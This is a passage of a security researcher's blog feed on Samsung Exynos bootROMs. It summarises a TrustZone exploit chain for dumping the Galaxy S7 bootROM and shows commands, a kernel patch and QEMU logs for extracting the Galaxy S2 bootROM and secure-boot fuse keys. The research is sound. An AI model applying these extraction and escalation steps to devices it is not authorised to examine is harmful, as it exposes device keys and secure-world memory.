&lt;p&gt;As a side note, the bootROM code we analyzed doesn't implement any mitigation technique. Probably because, at such early boot stage, performance is critical, MMU is disabled, and entropy is hard.&lt;/p&gt;</content><category term="arm"></category><category term="exynos"></category><category term="samsung"></category><category term="bootrom"></category><category term="usb"></category><category term="reverse"></category><category term="ghidra"></category></entry><entry><title>exynos8890-bootrom-dump : dump Exynos 8890 bootROM from Samsung Galaxy S7</title><link href="https://fredericb.info/2020/06/exynos8890-bootrom-dump-dump-exynos-8890-bootrom-from-samsung-galaxy-s7.html" rel="alternate"></link><published>2020-06-15T00:00:00-07:00</published><updated>2020-06-15T00:00:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2020-06-15:/2020/06/exynos8890-bootrom-dump-dump-exynos-8890-bootrom-from-samsung-galaxy-s7.html</id><summary type="html">&lt;p&gt;This post introduces a tool to dump Samsung Galaxy S7 bootROM using known and fixed security vulnerabilities in Trustzone.&lt;/p&gt;
&lt;p&gt;The source code is &lt;a href="https://github.com/frederic/exynos8890-bootrom-dump"&gt;available on GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Collect bootroms" src="https://fredericb.info/blog/exy-bootrom/Collect_bootroms.png" width="800px"&gt;&lt;/p&gt;
&lt;h1&gt;Procedure&lt;/h1&gt;
&lt;p&gt;We use a Galaxy S7 phone, with ADB access and root privileges.&lt;/p&gt;
&lt;p&gt;BootROM code is at address 0x0, in Secure world.
The TEE …&lt;/p&gt;</summary><content type="html">&lt;p&gt;This post introduces a tool to dump Samsung Galaxy S7 bootROM using known and fixed security vulnerabilities in Trustzone.&lt;/p&gt;
&lt;p&gt;The source code is &lt;a href="https://github.com/frederic/exynos8890-bootrom-dump"&gt;available on GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Collect bootroms" src="https://fredericb.info/blog/exy-bootrom/Collect_bootroms.png" width="800px"&gt;&lt;/p&gt;
&lt;h1&gt;Procedure&lt;/h1&gt;
&lt;p&gt;We use a Galaxy S7 phone, with ADB access and root privileges.&lt;/p&gt;
&lt;p&gt;BootROM code is at address 0x0, in Secure world.
The TEE (Trusted Execution Environment) running on this target is Trustonic Kinibi.&lt;/p&gt;
&lt;p&gt;The approach is to escalate from Android to a Trusted driver and read secure memory at address 0x0.&lt;/p&gt;
&lt;p&gt;We reuse fixed security bugs that are publicly documented.
Two exploits are required, one to exploit a Trusted Application from Android, then a second to exploit a Trusted Driver.
Both are simple stack overflow bugs. In both cases, return address is overwritten to redirect code execution to a ROP chain.&lt;/p&gt;
&lt;h2&gt;Trusted application exploitation&lt;/h2&gt;
&lt;p&gt;This part has been described by David Berard (p0ly) in &lt;a href="https://www.synacktiv.com/posts/exploit/kinibi-tee-trusted-application-exploitation.html"&gt;very well-written article from Synacktiv&lt;/a&gt;.
His work provides a very valuable starting point: an exploit for a Trusted Application with an example ROP chain.&lt;/p&gt;
&lt;p&gt;We port the original exploit to our target (G930F), and then change the ROP chain.
This &lt;a href="https://github.com/frederic/exynos8890-bootrom-dump/commit/7c5ac021adda8a4c7167e75f662b037ba7685341#diff-6ba3042607cf6d0399411c4c527da649R41"&gt;new ROP chain&lt;/a&gt; calls the vulnerable Trusted Driver to deliver the second exploit.&lt;/p&gt;
&lt;h2&gt;Trusted driver exploitation&lt;/h2&gt;
&lt;p&gt;The second bug has been disclosed in a &lt;a href="https://i.blackhat.com/USA-19/Thursday/us-19-Peterlin-Breaking-Samsungs-ARM-TrustZone.pdf"&gt;great talk from Quarkslab at BlackHat 2019&lt;/a&gt;. It is a trivial stack overflow due to &lt;em&gt;memcpy&lt;/em&gt; operation, so exploiting it from the first ROP chain is straightforward.&lt;/p&gt;
&lt;p&gt;The &lt;a href="https://github.com/frederic/exynos8890-bootrom-dump/commit/7c5ac021adda8a4c7167e75f662b037ba7685341#diff-6ba3042607cf6d0399411c4c527da649R104"&gt;ROP chain&lt;/a&gt; we execute in the context of the Trusted Driver does the following operations :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;map physical address of bootROM&lt;/li&gt;
&lt;li&gt;map shared (secure &amp;amp; non-secure) buffer we initially allocated on Android side&lt;/li&gt;
&lt;li&gt;copy mapped bootROM to shared buffer&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Finally, bootROM code is accessible to our Android executable.&lt;/p&gt;
&lt;h1&gt;Resources&lt;/h1&gt;
&lt;p&gt;This work has been possible thanks to the following previous research :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/taszksec/unbox-your-phone-part-i-331bbf44c30c"&gt;Unbox Your Phone&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.synacktiv.com/posts/exploit/kinibi-tee-trusted-application-exploitation.html"&gt;KINIBI TEE: TRUSTED APPLICATION EXPLOITATION&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://labs.bluefrostsecurity.de/files/TEE.pdf"&gt;Exploiting Trusted Apps on Samsung’s TEE&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://i.blackhat.com/USA-19/Thursday/us-19-Peterlin-Breaking-Samsungs-ARM-TrustZone.pdf"&gt;BREAKING SAMSUNG'S ARM TRUSTZONE&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="arm"></category><category term="exynos"></category><category term="samsung"></category><category term="bootrom"></category><category term="trustzone"></category><category term="exploit"></category></entry><entry><title>Emulating Exynos 4210 BootROM in QEMU</title><link href="https://fredericb.info/2018/03/emulating-exynos-4210-bootrom-in-qemu.html" rel="alternate"></link><published>2018-03-07T00:00:00-08:00</published><updated>2018-03-07T00:00:00-08:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2018-03-07:/2018/03/emulating-exynos-4210-bootrom-in-qemu.html</id><summary type="html">&lt;p&gt;&lt;a href="https://www.qemu.org/"&gt;QEMU&lt;/a&gt; has support for the SMDKC210 machine, an ARM board based on Exynos 4210 SoC.
Peripherals implemented in QEMU for this machine are &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/char/exynos4210_uart.c"&gt;UART&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/sd/sdhci.c"&gt;SDHCI&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/display/exynos4210_fimd.c"&gt;FIMD&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/i2c/exynos4210_i2c.c"&gt;I2C&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/intc/exynos4210_combiner.c"&gt;Interrupt Combiner&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/intc/exynos4210_gic.c"&gt;GIC&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/misc/exynos4210_clk.c"&gt;Clock&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/misc/exynos4210_pmu.c"&gt;PMU&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/misc/exynos4210_rng.c"&gt;RNG&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/timer/exynos4210_mct.c"&gt;MCT&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/timer/exynos4210_pwm.c"&gt;PWM&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/timer/exynos4210_rtc.c"&gt;RTC&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.gsmarena.com/samsung_i9100_galaxy_s_ii-3621.php"&gt;Samsung Galaxy S2&lt;/a&gt; phone is also based on Exynos 4210, so it should be …&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;a href="https://www.qemu.org/"&gt;QEMU&lt;/a&gt; has support for the SMDKC210 machine, an ARM board based on Exynos 4210 SoC.
Peripherals implemented in QEMU for this machine are &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/char/exynos4210_uart.c"&gt;UART&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/sd/sdhci.c"&gt;SDHCI&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/display/exynos4210_fimd.c"&gt;FIMD&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/i2c/exynos4210_i2c.c"&gt;I2C&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/intc/exynos4210_combiner.c"&gt;Interrupt Combiner&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/intc/exynos4210_gic.c"&gt;GIC&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/misc/exynos4210_clk.c"&gt;Clock&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/misc/exynos4210_pmu.c"&gt;PMU&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/misc/exynos4210_rng.c"&gt;RNG&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/timer/exynos4210_mct.c"&gt;MCT&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/timer/exynos4210_pwm.c"&gt;PWM&lt;/a&gt;, &lt;a href="https://git.qemu.org/?p=qemu.git;a=blob;f=hw/timer/exynos4210_rtc.c"&gt;RTC&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.gsmarena.com/samsung_i9100_galaxy_s_ii-3621.php"&gt;Samsung Galaxy S2&lt;/a&gt; phone is also based on Exynos 4210, so it should be &lt;strong&gt;&lt;em&gt;relatively&lt;/em&gt;&lt;/strong&gt; easy to emulate its BootROM in QEMU.&lt;/p&gt;
&lt;p&gt;This article describes how to extract BootROM (and associated fuses) from Galaxy S2 phone, implement additional required peripherals in QEMU (like the hardware cryptographic engine), and debug inevitable issues. Source code has been published on &lt;a href="https://github.com/frederic/qemu-exynos-bootrom"&gt;GitHub&lt;/a&gt;. We'll also take advantage of the dynamic debugging capability offered by QEMU to have a quick look at secure boot implementation.&lt;/p&gt;
&lt;h1&gt;Documentation&lt;/h1&gt;
&lt;p&gt;&lt;img alt="Exynos 4 Dual 45nm" src="https://fredericb.info/blog/qemu-exynos4210/exynos_4210_features.jpg" width="700px"&gt;&lt;/p&gt;
&lt;p&gt;Samsung has released &lt;a href="http://www.samsung.com/global/business/semiconductor/file/product/Exynos_4_Dual_45nm_User_Manaul_Public_REV1.00-0.pdf"&gt;a (partial) datasheet&lt;/a&gt;.
It includes the following memory map :&lt;/p&gt;
&lt;p&gt;&lt;img alt="Memory Map" src="https://fredericb.info/blog/qemu-exynos4210/exynos_4210_memmap.png"&gt;&lt;/p&gt;
&lt;p&gt;Another significant ressource is the &lt;a href="https://github.com/pngcui/uboot-2017.07-iTop4412"&gt;U-Boot source code&lt;/a&gt; for development boards (like &lt;a href="http://www.hardkernel.com/main/products/prdt_info.php?g_code=G133999328931"&gt;ODROID X&lt;/a&gt;) based on same processor. It contains interesting technical information on hardware peripherals (like addresses, registers, values).&lt;/p&gt;
&lt;p&gt;Finally, hacker &lt;a href="https://forum.xda-developers.com/showthread.php?t=1986887"&gt;community&lt;/a&gt; has &lt;a href="https://forum.xda-developers.com/showthread.php?t=1274999"&gt;contributed&lt;/a&gt; a &lt;a href="https://forum.xda-developers.com/showthread.php?t=1313588"&gt;lot&lt;/a&gt; over the past years.&lt;/p&gt;
&lt;h1&gt;Dump all the things&lt;/h1&gt;
&lt;p&gt;First of all, we have to extract the BootROM we want to emulate from the Exynos 4210 SoC. We will also extract fuses data and first bootloader (from flash memory) as they are required to complete execution of BootROM.&lt;/p&gt;
&lt;p&gt;We use a Galaxy S2 phone, with ADB access and root privileges thanks to &lt;a href="https://github.com/timwr/CVE-2013-6282"&gt;CVE-2013-6282 exploit&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Dump bootloader&lt;/h2&gt;
&lt;p&gt;The bootloader stored on flash memory is loaded, authenticated (eventually), and executed by BootROM.
Accessible through the &lt;strong&gt;mmcblk0boot0&lt;/strong&gt; device file, we dump it using builtin &lt;strong&gt;dd&lt;/strong&gt; command :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# dd if=/dev/block/mmcblk0boot0 of=./mmc_boot.img seek=1 bs=512&lt;/span&gt;
&lt;span class="m"&gt;1024&lt;/span&gt;+0 records in
&lt;span class="m"&gt;1024&lt;/span&gt;+0 records out
&lt;span class="m"&gt;524288&lt;/span&gt; bytes transferred in &lt;span class="m"&gt;0&lt;/span&gt;.091 secs &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5761406&lt;/span&gt; bytes/sec&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We generate an entropy graph of dumped data using &lt;a href="https://github.com/ReFirmLabs/binwalk"&gt;binwalk tool&lt;/a&gt; :&lt;/p&gt;
&lt;p&gt;&lt;img alt="Entropy of bootloader image" src="https://fredericb.info/blog/qemu-exynos4210/exynos_4210_bootloader_entropy.png"&gt;&lt;/p&gt;
&lt;p&gt;The first part with high entropy (almost E=1) is the encrypted FWBL1 image, the next stage to execute after BootROM.&lt;/p&gt;
&lt;h2&gt;Dump BootROM&lt;/h2&gt;
&lt;p&gt;Memory map indicates that BootROM, also called iROM, is mapped at address &lt;strong&gt;0x0000_0000&lt;/strong&gt;.
On this device, stock Android kernel is compiled with &lt;strong&gt;&lt;em&gt;/dev/mem&lt;/em&gt;&lt;/strong&gt; support, so we can directly use the simple &lt;a href="https://github.com/Vee7-Cyanogenmod13/device_lge_l7II/tree/cm-13.0/viewmem"&gt;viewmem tool&lt;/a&gt; to dump BootROM (yeah, chipset from 2011).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# ./viewmem 0x00000000 0x10000 &amp;gt; ./bootrom.bin       &lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; Reading &lt;span class="m"&gt;65536&lt;/span&gt; bytes at 0x0...
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Dump fuses&lt;/h2&gt;
&lt;p&gt;Fuses a.k.a. One-Time Programmable (OTP) memory usually contain important information for security, like boot settings, cryptographic keys or hashes.
According to datasheet, fuses are in the &lt;strong&gt;SECKEY&lt;/strong&gt; area at address &lt;strong&gt;0x10100000&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;However in this case, &lt;a href="https://github.com/Vee7-Cyanogenmod13/device_lge_l7II/tree/cm-13.0/viewmem"&gt;viewmem tool&lt;/a&gt; fails to read data directly.
The cause of this issue is explained in &lt;a href="https://redmine.replicant.us/projects/replicant/wiki/NexusSI902xBootloader"&gt;another research&lt;/a&gt; for a similar processor.
We learn that accessing &lt;strong&gt;SECKEY&lt;/strong&gt; requires to enable the specific hardware clock &lt;strong&gt;CLK_SECKEY&lt;/strong&gt; (bit 12 of &lt;strong&gt;CLK_GATE_IP_PERIR&lt;/strong&gt; register).&lt;/p&gt;
&lt;p&gt;The solution is to build a modified kernel to enable that clock at boot.&lt;/p&gt;
&lt;p&gt;Samsung has released the &lt;a href="http://opensource.samsung.com/reception/receptionSub.do?method=sub&amp;amp;sub=F&amp;amp;searchValue=sph-d710"&gt;kernel source code&lt;/a&gt;, however initramfs is missing to generate a fully fonctional kernel image. So we dump the original kernel partition (like we did for bootloader partition) and &lt;a href="https://github.com/davidmroth/Extract-Kernel-Initramfs"&gt;extract&lt;/a&gt; initramfs archive. We can then append extracted initramfs to our custom kernel by setting &lt;strong&gt;&lt;em&gt;CONFIG_INITRAMFS_DIRECTORY&lt;/em&gt;&lt;/strong&gt; option in kernel configuration.&lt;/p&gt;
&lt;p&gt;We apply the following kernel patch to enable &lt;strong&gt;CLK_SECKEY&lt;/strong&gt; clock at boot :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gd"&gt;--- a/arch/arm/mach-exynos/clock-exynos4.c  2013-02-21 05:23:03.000000000 -0800&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/arch/arm/mach-exynos/clock-exynos4.c  2018-02-25 00:11:03.817693249 -0800&lt;/span&gt;
&lt;span class="gu"&gt;@@ -1352,11 +1352,11 @@&lt;/span&gt;

 static struct clk exynos4_init_clocks[] = {
    {
&lt;span class="gd"&gt;-#ifndef CONFIG_CPU_EXYNOS4210&lt;/span&gt;
        .name       = &amp;quot;seckey&amp;quot;,
        .enable     = exynos4_clk_ip_perir_ctrl,
        .ctrlbit    = (1 &amp;lt;&amp;lt; 12),
    }, {
&lt;span class="gi"&gt;+#ifndef CONFIG_CPU_EXYNOS4210&lt;/span&gt;
        .name       = &amp;quot;tzpc&amp;quot;,
        .devname    = &amp;quot;exnos4-tzpc.5&amp;quot;,
        .enable     = exynos4_clk_ip_perir_ctrl,
&lt;span class="gu"&gt;@@ -2386,6 +2386,17 @@&lt;/span&gt;

    for (ptr = 0; ptr &amp;lt; ARRAY_SIZE(exynos4_clksrcs); ptr++)
        s3c_set_clksrc(&amp;amp;exynos4_clksrcs[ptr], true);
&lt;span class="gi"&gt;+&lt;/span&gt;
&lt;span class="gi"&gt;+   printk(KERN_INFO &amp;quot;%s: Looking for seckey clock...\n&amp;quot;, __func__);&lt;/span&gt;
&lt;span class="gi"&gt;+   for (ptr = 0; ptr &amp;lt; ARRAY_SIZE(exynos4_init_clocks); ptr++) {&lt;/span&gt;
&lt;span class="gi"&gt;+       if (exynos4_init_clocks[ptr].name == NULL)&lt;/span&gt;
&lt;span class="gi"&gt;+           break;&lt;/span&gt;
&lt;span class="gi"&gt;+&lt;/span&gt;
&lt;span class="gi"&gt;+       if (strcmp(&amp;quot;seckey&amp;quot;, exynos4_init_clocks[ptr].name) == 0) {&lt;/span&gt;
&lt;span class="gi"&gt;+           printk(KERN_INFO &amp;quot;%s: Enabling seckey clock\n&amp;quot;, __func__);&lt;/span&gt;
&lt;span class="gi"&gt;+           clk_enable(&amp;amp;exynos4_init_clocks[ptr]);&lt;/span&gt;
&lt;span class="gi"&gt;+       }&lt;/span&gt;
&lt;span class="gi"&gt;+   }&lt;/span&gt;
 }

 static struct clk *exynos4_clks[] __initdata = {
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After flashing and booting this custom kernel on Galasy S2 device, we can dump fuses data with &lt;a href="https://github.com/Vee7-Cyanogenmod13/device_lge_l7II/tree/cm-13.0/viewmem"&gt;viewmem tool&lt;/a&gt;, like we did for BootROM :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# ./viewmem 0x10100000 0x100 &amp;gt; ./fuses.bin           &lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; Reading &lt;span class="m"&gt;256&lt;/span&gt; bytes at 0x10100000...
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Debugging&lt;/h1&gt;
&lt;p&gt;We have the BootROM, fuses data, and the first bootloader from flash memory.
However, we should not expect it to run properly on the first try.&lt;/p&gt;
&lt;p&gt;The following QEMU features were used to debug issues and develop new QEMU peripherals :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://git.qemu.org/?p=qemu.git;a=blob_plain;f=docs/devel/tracing.txt;hb=HEAD"&gt;Trace events&lt;/a&gt; : output debug log when specific instructions are hit.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.qemu.org/Documentation/Debugging"&gt;GDB stub&lt;/a&gt; : attach your favorite debugger i.e. GDB or IDA.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikibooks.org/wiki/QEMU/Monitor"&gt;Monitor console&lt;/a&gt; : interact with QEMU while guest is running, for example to enable specific trace events.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Most issues are related to peripherals and will cause QEMU to hang (e.g. infinite loop due to polling of non-implemented hardware register).&lt;/p&gt;
&lt;h1&gt;QEMU changes&lt;/h1&gt;
&lt;p&gt;Despite the number of peripherals implemented for this SoC, some are still missing to complete execution of BootROM with success.
Following sections describe the main changes made in &lt;a href="https://github.com/frederic/qemu-exynos-bootrom"&gt;QEMU source tree&lt;/a&gt; for this project. New peripherals are heavily based on existing ones in upstream QEMU project.&lt;/p&gt;
&lt;h2&gt;Add BootROM loading support&lt;/h2&gt;
&lt;p&gt;For this machine, QEMU is supposed to run U-Boot bootloader or Linux kernel directly. By default, only a &lt;a href="https://github.com/qemu/qemu/blob/master/hw/arm/exynos4210.c#L128"&gt;small &amp;amp; minimal bootloader&lt;/a&gt; is loaded in secondary CPUs, which is not relevant for this project.&lt;/p&gt;
&lt;p&gt;In order to load BootROM in memory before starting the machine, we take advantage of the existing BIOS loading feature in QEMU.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/frederic/qemu-exynos-bootrom/commit/23ce5e32774a2ae834e3ed99dd2d26a1be5a2d8a"&gt;With this change&lt;/a&gt;, BootROM image file can now be loaded in memory thanks to &lt;strong&gt;-bios&lt;/strong&gt; parameter. It will be executed directly when emulated machine is reset.&lt;/p&gt;
&lt;h2&gt;One-Time Programmable (OTP) memory emulation&lt;/h2&gt;
&lt;p&gt;One-Time Programmable (OTP) memory is a MMIO peripheral used to store device-specific data. Read operations can be performed with simple load instructions, but write operations (or fusing) are usually more complex.&lt;/p&gt;
&lt;p&gt;For this project, OTP peripheral is &lt;a href="https://github.com/frederic/qemu-exynos-bootrom/commit/70c8b2088c6e24d7863609a2368e3591859a114d"&gt;implemented as a simple read-only memory&lt;/a&gt;, initialized with fuses data dumped from Galaxy S2 device. Write operations are not supported.&lt;/p&gt;
&lt;p&gt;When BootROM is executed, QEMU debug log provides detailed information on OTP data accessed.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;First OTP access is a read operation on area 0x18-0x2C. Based on static analysis, BootROM checks these fuses are provisioned (not null) :&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x18&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x1c&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x20&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x24&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x28&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Same area 0x18-0x2C (20 bytes) is read a second time to derive HMAC-SHA1 key (to authenticate next bootloader) :&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x18&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x19&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;[...]&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x2a&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x2b&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;The area is read a third time, but only first 16 bytes, to derive AES-CBC-128 key (to decrypt next bootloader) :&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x18&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
